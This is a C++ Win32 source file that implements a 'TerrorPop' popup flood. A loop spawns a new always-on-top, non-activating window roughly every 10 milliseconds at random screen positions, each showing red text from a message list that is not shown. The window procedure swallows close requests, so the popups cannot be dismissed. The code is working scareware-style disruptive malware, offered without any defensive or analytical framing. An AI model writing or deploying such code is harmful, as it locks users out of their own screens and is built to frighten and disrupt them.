#include "popup.h"
#include "globals.h"

static const wchar_t POP_CLS[] = L"TerrorPop";

static COLORREF PopBgColor(int i) {
    COLORREF t[]={RGB(10,0,0),RGB(0,0,15),RGB(15,0,0),RGB(8,0,8),RGB(0,10,0),RGB(20,0,0),RGB(5,5,0)};
    return t[i%7];
}
static COLORREF PopBorderColor(int i) {
    COLORREF t[]={RGB(200,0,0),RGB(0,0,200),RGB(220,20,20),RGB(180,0,180),RGB(0,180,0),RGB(255,50,0),RGB(200,200,0)};
    return t[i%7];
}

LRESULT CALLBACK PopupWndProc(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch(msg) {
    case WM_CREATE:
        SetWindowLongPtrW(hWnd,GWLP_USERDATA,(LONG_PTR)((CREATESTRUCT*)lp)->lpCreateParams);
        return 0;
    case WM_ERASEBKGND: return 1;
    case WM_PAINT: {
        int idx=(int)GetWindowLongPtrW(hWnd,GWLP_USERDATA);
        PAINTSTRUCT ps; HDC hdc=BeginPaint(hWnd,&ps);
        RECT rc; GetClientRect(hWnd,&rc);
        HBRUSH bg=CreateSolidBrush(PopBgColor(idx)); FillRect(hdc,&rc,bg); DeleteObject(bg);
        HPEN pen=CreatePen(PS_SOLID,5,PopBorderColor(idx));
        SelectObject(hdc,pen); SelectObject(hdc,GetStockObject(NULL_BRUSH));
        Rectangle(hdc,3,3,rc.right-3,rc.bottom-3); DeleteObject(pen);
        HPEN pen2=CreatePen(PS_SOLID,1,PopBorderColor(idx));
        SelectObject(hdc,pen2); Rectangle(hdc,8,8,rc.right-8,rc.bottom-8); DeleteObject(pen2);
        HFONT fnt=CreateFontW(40,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,ANTIALIASED_QUALITY,DEFAULT_PITCH,L"Arial");
        SelectObject(hdc,fnt); SetBkMode(hdc,TRANSPARENT); SetTextColor(hdc,RGB(255,40,40));
        DrawTextW(hdc,MSGS[idx%MSG_COUNT],-1,&rc,DT_CENTER|DT_VCENTER|DT_SINGLELINE);
        DeleteObject(fnt); EndPaint(hWnd,&ps); return 0;
    }
    case WM_CLOSE: return 0;
    case WM_SYSCOMMAND: if((wp&0xFFF0)==SC_CLOSE) return 0; break;
    }
    return DefWindowProcW(hWnd,msg,wp,lp);
}

void PopupFloodThread() {
    WNDCLASSW wc={}; wc.lpfnWndProc=PopupWndProc;
    wc.hInstance=GetModuleHandleW(nullptr); wc.lpszClassName=POP_CLS;
    RegisterClassW(&wc);
    std::uniform_int_distribution<int> rx(0,SW>720?SW-720:0);
    std::uniform_int_distribution<int> ry(0,SH>130?SH-130:0);
    std::mt19937 rng((unsigned)GetTickCount());
    DWORD lastSpawn=0; int spawnIdx=0;
    while(g_running) {
        DWORD now=GetTickCount();
        if(now-lastSpawn>=10) {
            int px=rx(rng),py=ry(rng),msgIdx=spawnIdx%MSG_COUNT;
            HWND hw=CreateWindowExW(WS_EX_TOPMOST|WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE,
                POP_CLS,L"",WS_POPUP,px,py,740,140,nullptr,nullptr,
                GetModuleHandleW(nullptr),(LPVOID)(INT_PTR)msgIdx);
            if(hw){
                SetWindowPos(hw,HWND_TOPMOST,px,py,740,140,
                    SWP_SHOWWINDOW|SWP_NOACTIVATE|SWP_NOSENDCHANGING);
                UpdateWindow(hw); spawnIdx++;
            }
            lastSpawn=now;
        }
        MSG m;
        while(PeekMessageW(&m,nullptr,0,0,PM_REMOVE)){
            if(m.message==WM_QUIT){g_running=false;break;}
            TranslateMessage(&m); DispatchMessageW(&m);
        }
        Sleep(1);
    }
}
